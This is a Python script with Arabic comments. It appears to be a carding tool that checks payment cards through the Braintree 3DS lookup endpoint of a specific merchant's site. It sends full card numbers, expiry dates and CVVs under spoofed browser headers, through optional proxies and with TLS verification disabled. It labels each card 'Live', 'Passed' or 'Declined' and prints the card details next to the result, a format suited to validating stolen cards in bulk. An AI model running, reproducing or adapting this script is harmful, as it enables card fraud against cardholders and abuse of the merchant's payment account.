"""
بوابة الدفع: Braintree 3DS Secure LookUp 1
الموقع: www.suspensionlifts.com
نوع البوابة: Braintree 3DS Secure LookUp
تدفق الطلبات:
1. POST https://api.braintreegateway.com/merchants/zkfxm943krx3chf3/client_api/v1/payment_methods/credit_card/three_d_secure/lookup -> التحقق من حالة 3DS
"""
import aiohttp
import asyncio
import uuid
import ssl

MERCHANT_ID = "zkfxm943krx3chf3"
MERCHANT_SITE = "www.suspensionlifts.com"


async def req1_3ds_lookup(
    session: aiohttp.ClientSession,
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str = None,
) -> dict:
    """الخطوة 1: إجراء 3DS Secure LookUp مباشرة."""
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": f"https://{MERCHANT_SITE}",
        "referer": f"https://{MERCHANT_SITE}/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }
    data = {
        "amount": "100.00",
        "additionalInfo": {
            "billingLine1": "123 Street",
            "billingCity": "New York",
            "billingPostalCode": "10001",
            "billingCountryCode": "US",
            "billingGivenName": "John",
            "billingSurname": "Doe",
        },
        "bin": cc[:6],
        "dfReferenceId": str(uuid.uuid4()),
        "clientMetadata": {
            "requestedThreeDSecureVersion": "2",
            "sdkVersion": "web/3.94.0",
        },
        "creditCard": {
            "number": cc,
            "expirationMonth": mm,
            "expirationYear": yy,
            "cvv": cvv,
        },
    }
    try:
        async with session.post(
            f"https://api.braintreegateway.com/merchants/{MERCHANT_ID}/client_api/v1/payment_methods/credit_card/three_d_secure/lookup",
            json=data,
            headers=headers,
            proxy=proxy_url,
        ) as r:
            return await r.json(content_type=None)
    except Exception as e:
        raise RuntimeError(f"req1_3ds_lookup failed: {e}") from e


async def process_B3_LookUp1_secure(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Braintree 3DS Secure LookUp 1."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            res = await req1_3ds_lookup(session, cc, mes, ano, cvv, proxy_url)

    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    status = res.get("status", "")
    if not status and "paymentMethod" in res:
        status = res["paymentMethod"].get("threeDSecureInfo", {}).get("status", "")

    if status == "challenge_required":
        status_icon = "𝐋𝐢𝐯𝐞 ✅"
        response_msg = "Challenge Required"
    elif status == "authenticate_successful":
        status_icon = "𝐏𝐚𝐬𝐬𝐞𝐝 ✅"
        response_msg = "Authenticate Successful"
    elif status == "authenticate_rejected":
        status_icon = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        response_msg = "Authenticate Rejected"
    else:
        status_icon = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        msg = res.get("message", "Unknown Status")
        response_msg = f"Status: {status} - {msg}"

    return f"{status_icon} | {cc}|{mes}|{ano}|{cvv}", response_msg
